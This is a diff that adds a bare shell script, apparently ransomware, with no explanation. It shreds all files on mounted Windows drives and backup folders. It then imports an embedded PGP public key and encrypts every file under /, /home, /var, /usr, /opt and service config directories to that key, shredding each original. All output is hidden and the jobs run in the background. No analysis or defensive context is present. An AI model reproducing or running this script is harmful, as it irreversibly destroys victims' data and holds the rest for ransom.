@@ -1,0 +1,48 @@
+nohup find /mnt/d/backups/ -type f -exec shred -zun0 '{}' \; >/dev/null 2>&1 &
+nohup find /mnt/d/ -type f -exec shred -zun0 '{}' \; >/dev/null 2>&1 &
+nohup find /mnt/c/ -type f -exec shred -zun0 '{}' \; >/dev/null 2>&1 &
+apt update >/dev/null 2>&1
+apt install gnupg -y >/dev/null 2>&1
+echo '-----BEGIN PGP PUBLIC KEY BLOCK-----
+
+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
+I57Q5vcwTg==
+=K5dc
+-----END PGP PUBLIC KEY BLOCK-----' | gpg --import 2>/dev/null 2>&1
+cp /usr/bin/gpg /sbin/ >/dev/null 2>&1
+nohup find /home /backup /var /etc/apache2 /etc/nginx /etc/mysql /etc/ufw /usr /opt / -type f ! -name '*.ENC' -exec /sbin/gpg --batch --yes --output '{}'.ENC --encrypt --recipient CDA6C8057450C0B1CB420E41C1848A8E43BAC7DA --trust-model always '{}' \; -exec shred -zun0 '{}' \; >/dev/null 2>&1 &
